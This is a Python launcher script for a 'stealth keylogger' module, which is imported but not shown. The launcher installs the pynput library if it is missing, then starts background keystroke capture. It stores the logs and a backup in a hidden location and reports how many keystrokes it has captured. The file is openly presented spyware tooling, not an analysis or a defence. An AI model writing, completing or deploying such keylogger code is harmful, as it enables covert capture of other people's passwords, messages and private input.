   #!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Professional launcher for the stealth keylogger
"""

import os
import sys
import time
from stealth_keylogger import StealthKeylogger

def main():
    """Launch the stealth keylogger"""
    print("Stealth Keylogger Launcher")
    print("=" * 40)
    
    # Check if pynput is available
    try:
        import pynput
        print("pynput is available")
    except ImportError:
        print("pynput not found. Installing...")
        os.system("pip install pynput")
        try:
            import pynput
            print("pynput installed successfully")
        except ImportError:
            print("Failed to install pynput")
            return
    
    print("\nStarting stealth keylogger...")
    print("This will run in the background and capture keystrokes")
    print("Press ESC key to stop logging")
    print("Data will be saved to hidden location")
    
    # Create and start keylogger
    keylogger = StealthKeylogger()
    
    try:
        # Start logging
        keylogger.start()
        print("Keylogger started successfully")
        
        # Show storage location
        stats = keylogger.get_stats()
        print(f"Data stored in: {stats['storage_location']}")
        print(f"Log file: {stats['log_file']}")
        print(f"Backup file: {stats['backup_file']}")
        
        print("\nKeystroke logging is now active")
        print("Type in any window to test")
        print("Logger will run until you press ESC")
        
        # Keep running
        while keylogger.running:
            time.sleep(1)
            
            # Show progress every 60 seconds
            if int(time.time()) % 60 == 0:
                stats = keylogger.get_stats()
                print(f"Captured {stats['total_keystrokes']} keystrokes")
        
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
    except Exception as e:
        print(f"\nError: {e}")
    finally:
        # Stop and cleanup
        keylogger.stop()
        print("Keylogger stopped")
        
        # Show final stats
        stats = keylogger.get_stats()
        print(f"\nFinal Statistics:")
        print(f"  Total keystrokes: {stats['total_keystrokes']}")
        print(f"  Storage location: {stats['storage_location']}")
        print(f"  Log file: {stats['log_file']}")
        print(f"  Backup file: {stats['backup_file']}")

if __name__ == "__main__":
    main()
